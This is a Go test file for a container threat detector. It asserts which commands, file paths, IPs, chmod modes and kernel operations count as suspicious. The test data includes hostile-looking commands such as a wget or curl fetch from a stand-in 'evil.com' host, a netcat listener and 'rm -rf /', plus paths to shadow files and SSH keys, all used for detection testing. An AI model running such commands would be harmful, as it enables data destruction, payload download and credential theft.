package server

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"google.golang.org/protobuf/types/known/timestamppb"

	pb "pod-controller/pkg/telemetry"
)

func TestNewThreatDetector(t *testing.T) {
	td := NewThreatDetector()

	assert.NotNil(t, td)
	assert.NotNil(t, td.processSpawnCount)
	assert.NotNil(t, td.networkConnCount)
}

func TestIsSuspiciousCommand(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "wget command",
			command:  "wget http://malicious.com/payload",
			expected: true,
		},
		{
			name:     "curl command",
			command:  "curl -o /tmp/script http://evil.com",
			expected: true,
		},
		{
			name:     "base64 decode",
			command:  "echo 'ZXZpbCBjb21tYW5k' | base64 -d",
			expected: true,
		},
		{
			name:     "netcat listener",
			command:  "nc -l -p 4444",
			expected: true,
		},
		{
			name:     "python reverse shell",
			command:  "python -c 'import socket'",
			expected: true,
		},
		{
			name:     "legitimate cat command",
			command:  "cat /etc/hostname",
			expected: false,
		},
		{
			name:     "legitimate ls command",
			command:  "ls -la /home",
			expected: false,
		},
		{
			name:     "legitimate ps command",
			command:  "ps aux",
			expected: false,
		},
		{
			name:     "docker command (legitimate)",
			command:  "docker ps",
			expected: false,
		},
		{
			name:     "bash with suspicious content",
			command:  "bash -c 'rm -rf /'",
			expected: true,
		},
		{
			name:     "ssh command",
			command:  "ssh user@192.168.1.1",
			expected: true,
		},
		{
			name:     "scp command",
			command:  "scp file user@host:/tmp/",
			expected: true,
		},
		{
			name:     "chmod 777",
			command:  "chmod 777 /etc/passwd",
			expected: true,
		},
		{
			name:     "chown to root",
			command:  "chown root:root /tmp/evil",
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.IsSuspiciousCommand(tt.command)
			assert.Equal(t, tt.expected, result, "Command: %s", tt.command)
		})
	}
}

func TestIsSuspiciousFileAccess(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name     string
		path     string
		expected bool
	}{
		{
			name:     "shadow file",
			path:     "/etc/shadow",
			expected: true,
		},
		{
			name:     "passwd file",
			path:     "/etc/passwd",
			expected: true,
		},
		{
			name:     "ssh keys",
			path:     "/root/.ssh/id_rsa",
			expected: true,
		},
		{
			name:     "kernel modules",
			path:     "/lib/modules/5.4.0/kernel/drivers/char/random.ko",
			expected: true,
		},
		{
			name:     "proc filesystem",
			path:     "/proc/1/mem",
			expected: true,
		},
		{
			name:     "sys filesystem",
			path:     "/sys/class/net/eth0/address",
			expected: true,
		},
		{
			name:     "docker socket",
			path:     "/var/run/docker.sock",
			expected: true,
		},
		{
			name:     "legitimate hostname",
			path:     "/etc/hostname",
			expected: false,
		},
		{
			name:     "legitimate resolv.conf",
			path:     "/etc/resolv.conf",
			expected: false,
		},
		{
			name:     "user home directory",
			path:     "/home/user/document.txt",
			expected: false,
		},
		{
			name:     "tmp directory",
			path:     "/tmp/tempfile",
			expected: false,
		},
		{
			name:     "var log directory",
			path:     "/var/log/syslog",
			expected: true, // logs can be sensitive
		},
		{
			name:     "boot directory",
			path:     "/boot/vmlinuz",
			expected: true,
		},
		{
			name:     "dev directory",
			path:     "/dev/null",
			expected: false, // /dev/null is commonly accessed
		},
		{
			name:     "sensitive dev file",
			path:     "/dev/mem",
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.IsSuspiciousFileAccess(tt.path)
			assert.Equal(t, tt.expected, result, "Path: %s", tt.path)
		})
	}
}

func TestIsExternalConnection(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name     string
		ip       string
		expected bool
	}{
		{
			name:     "localhost",
			ip:       "127.0.0.1",
			expected: false,
		},
		{
			name:     "private network 192.168",
			ip:       "192.168.1.1",
			expected: false,
		},
		{
			name:     "private network 10.x",
			ip:       "10.0.0.1",
			expected: false,
		},
		{
			name:     "private network 172.16-31",
			ip:       "172.16.0.1",
			expected: false,
		},
		{
			name:     "google DNS",
			ip:       "8.8.8.8",
			expected: true,
		},
		{
			name:     "cloudflare DNS",
			ip:       "1.1.1.1",
			expected: true,
		},
		{
			name:     "external server",
			ip:       "203.0.113.1",
			expected: true,
		},
		{
			name:     "empty IP",
			ip:       "",
			expected: false,
		},
		{
			name:     "invalid IP",
			ip:       "invalid-ip",
			expected: false,
		},
		{
			name:     "ipv6 localhost",
			ip:       "::1",
			expected: false,
		},
		{
			name:     "kubernetes service network",
			ip:       "10.96.0.1",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.IsExternalConnection(tt.ip)
			assert.Equal(t, tt.expected, result, "IP: %s", tt.ip)
		})
	}
}

func TestIsSuspiciousChmod(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name     string
		path     string
		mode     uint32
		expected bool
	}{
		{
			name:     "chmod 777 on sensitive file",
			path:     "/etc/passwd",
			mode:     0777,
			expected: true,
		},
		{
			name:     "chmod 777 on regular file",
			path:     "/tmp/testfile",
			mode:     0777,
			expected: true, // 777 is suspicious regardless
		},
		{
			name:     "chmod 666 on regular file",
			path:     "/tmp/testfile",
			mode:     0666,
			expected: false,
		},
		{
			name:     "chmod 755 on binary",
			path:     "/usr/bin/test",
			mode:     0755,
			expected: false,
		},
		{
			name:     "chmod 600 on ssh key",
			path:     "/root/.ssh/id_rsa",
			mode:     0600,
			expected: false,
		},
		{
			name:     "chmod 644 on config file",
			path:     "/etc/nginx.conf",
			mode:     0644,
			expected: false,
		},
		{
			name:     "setuid bit on sensitive location",
			path:     "/etc/passwd",
			mode:     04755,
			expected: true,
		},
		{
			name:     "setgid bit on sensitive location",
			path:     "/etc/shadow",
			mode:     02755,
			expected: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.IsSuspiciousChmod(tt.path, tt.mode)
			assert.Equal(t, tt.expected, result, "Path: %s, Mode: %o", tt.path, tt.mode)
		})
	}
}

func TestDetectAnomalousProcessSpawning(t *testing.T) {
	td := NewThreatDetector()
	containerID := "test-container-123"

	event := &pb.SecurityEvent{
		EventType: pb.EventType_EXEC,
		Pid:       1234,
		Command:   "test-command",
		Timestamp: timestamppb.Now(),
	}

	// First few spawns should not be anomalous
	for i := 0; i < 5; i++ {
		result := td.detectAnomalousProcessSpawning(event, containerID)
		assert.False(t, result, "Spawn %d should not be anomalous", i+1)
	}

	// Rapid spawning should be detected as anomalous
	for i := 0; i < 20; i++ {
		td.detectAnomalousProcessSpawning(event, containerID)
	}
	result := td.detectAnomalousProcessSpawning(event, containerID)
	assert.True(t, result, "Rapid spawning should be detected as anomalous")
}

func TestDetectAnomalousNetworkActivity(t *testing.T) {
	td := NewThreatDetector()
	containerID := "test-container-123"

	// Test normal network activity
	event1 := &pb.SecurityEvent{
		EventType:       pb.EventType_CONNECT,
		Pid:             1234,
		Command:         "curl",
		DestinationIp:   "8.8.8.8",
		DestinationPort: 80,
		Timestamp:       timestamppb.Now(),
	}

	result := td.detectAnomalousNetworkActivity(event1, containerID)
	assert.False(t, result, "Single connection should not be anomalous")

	// Test connections to many different destinations
	for i := 0; i < 15; i++ {
		event := &pb.SecurityEvent{
			EventType:       pb.EventType_CONNECT,
			Pid:             1234,
			Command:         "suspicious-tool",
			DestinationIp:   "203.0.113." + string(rune(i+1)),
			DestinationPort: 80,
			Timestamp:       timestamppb.Now(),
		}
		td.detectAnomalousNetworkActivity(event, containerID)
	}

	// Should detect anomalous activity
	anomalousEvent := &pb.SecurityEvent{
		EventType:       pb.EventType_CONNECT,
		Pid:             1234,
		Command:         "suspicious-tool",
		DestinationIp:   "203.0.113.100",
		DestinationPort: 80,
		Timestamp:       timestamppb.Now(),
	}
	result = td.detectAnomalousNetworkActivity(anomalousEvent, containerID)
	assert.True(t, result, "Many connections to different destinations should be anomalous")
}

func TestIsPrivilegedOperation(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name     string
		event    *pb.SecurityEvent
		expected bool
	}{
		{
			name: "setuid to root",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_SETUID,
				Uid:       0,
			},
			expected: true,
		},
		{
			name: "setuid to regular user",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_SETUID,
				Uid:       1000,
			},
			expected: false,
		},
		{
			name: "setgid to root group",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_SETGID,
				Gid:       0,
			},
			expected: true,
		},
		{
			name: "ptrace operation",
			event: &pb.SecurityEvent{
				EventType:       pb.EventType_PTRACE,
				PtraceTargetPid: 1,
			},
			expected: true,
		},
		{
			name: "mount operation",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_MOUNT,
				FilePath:  "/proc",
			},
			expected: true,
		},
		{
			name: "capability modification",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_CAPSET,
			},
			expected: true,
		},
		{
			name: "regular file access",
			event: &pb.SecurityEvent{
				EventType: pb.EventType_OPEN,
				FilePath:  "/tmp/file",
			},
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.isPrivilegedOperation(tt.event)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestIsSuspiciousPtraceOperation(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name      string
		request   int64
		targetPid int32
		expected  bool
	}{
		{
			name:      "PTRACE_POKETEXT on init",
			request:   4, // PTRACE_POKETEXT
			targetPid: 1,
			expected:  true,
		},
		{
			name:      "PTRACE_POKEDATA on init",
			request:   5, // PTRACE_POKEDATA
			targetPid: 1,
			expected:  true,
		},
		{
			name:      "PTRACE_ATTACH on regular process",
			request:   16, // PTRACE_ATTACH
			targetPid: 1234,
			expected:  false,
		},
		{
			name:      "PTRACE_TRACEME",
			request:   0, // PTRACE_TRACEME
			targetPid: 0,
			expected:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.isSuspiciousPtraceOperation(tt.request, tt.targetPid)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestIsSuspiciousMount(t *testing.T) {
	td := NewThreatDetector()

	tests := []struct {
		name     string
		path     string
		expected bool
	}{
		{
			name:     "mount /proc",
			path:     "/proc",
			expected: true,
		},
		{
			name:     "mount /sys",
			path:     "/sys",
			expected: true,
		},
		{
			name:     "mount /dev",
			path:     "/dev",
			expected: true,
		},
		{
			name:     "mount /host/proc",
			path:     "/host/proc",
			expected: true,
		},
		{
			name:     "mount /var/run/docker.sock",
			path:     "/var/run/docker.sock",
			expected: true,
		},
		{
			name:     "mount regular directory",
			path:     "/tmp/mount",
			expected: false,
		},
		{
			name:     "mount home directory",
			path:     "/home/user",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := td.isSuspiciousMount(tt.path)
			assert.Equal(t, tt.expected, result, "Path: %s", tt.path)
		})
	}
}

func BenchmarkIsSuspiciousCommand(b *testing.B) {
	td := NewThreatDetector()
	commands := []string{
		"wget http://example.com",
		"curl -o /tmp/file http://test.com",
		"nc -l -p 4444",
		"cat /etc/passwd",
		"ls -la",
		"ps aux",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cmd := commands[i%len(commands)]
		td.IsSuspiciousCommand(cmd)
	}
}

func BenchmarkIsExternalConnection(b *testing.B) {
	td := NewThreatDetector()
	ips := []string{
		"127.0.0.1",
		"192.168.1.1",
		"8.8.8.8",
		"1.1.1.1",
		"10.0.0.1",
		"203.0.113.1",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ip := ips[i%len(ips)]
		td.IsExternalConnection(ip)
	}
}
